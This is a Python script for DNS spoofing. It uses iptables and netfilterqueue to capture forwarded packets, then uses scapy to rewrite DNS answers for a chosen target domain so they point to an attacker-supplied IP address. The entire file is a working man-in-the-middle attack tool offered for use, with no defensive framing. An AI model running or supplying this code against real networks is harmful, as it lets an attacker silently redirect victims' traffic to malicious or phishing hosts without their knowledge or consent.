#!/usr/bin/env python

import netfilterqueue
import subprocess
import scapy.all as scapy
import optparse


# command line arguments
def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t","--target",dest="targetdomain",help="Target domain to spoof")
    parser.add_option("-s","--spoofed-ip",dest="spoofedip",help="Spoofed IP")
    (options, arguments) = parser.parse_args()
    if not options.targetdomain:
        parser.error("[-] Please enter a target domain, use --help for more info")
    if not options.spoofedip:
        parser.error("[-] Please enter an IP to be used for spoofing, use --help for more info")
    else:
        return options

# processing each packet 
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # is it a DNS request ?
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        # are we trying to spoof this domain?
        if target_site in qname:
            # if so then replace the response with our own response
            print("[+] Spoofing target: " + target_site)
            answer = scapy.DNSRR(rrname=qname,rdata=spoofed_site)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            packet.set_payload(str(scapy_packet))
    packet.accept()

# get the command line args
options = get_arguments()

target_site = options.targetdomain
spoofed_site = options.spoofedip


try:
    print("[+] Creating IP tables")
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0",shell=True)
    # local testing
    #subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0",shell=True)
    #subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0",shell=True)
    # local testing
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0,process_packet)
    queue.run()
except KeyboardInterrupt:
    print("[+] Detected CTRL+C ")
    print("[+] Flushing IP tables")
    subprocess.call("iptables --flush",shell=True)
    print("[+] Quitting")


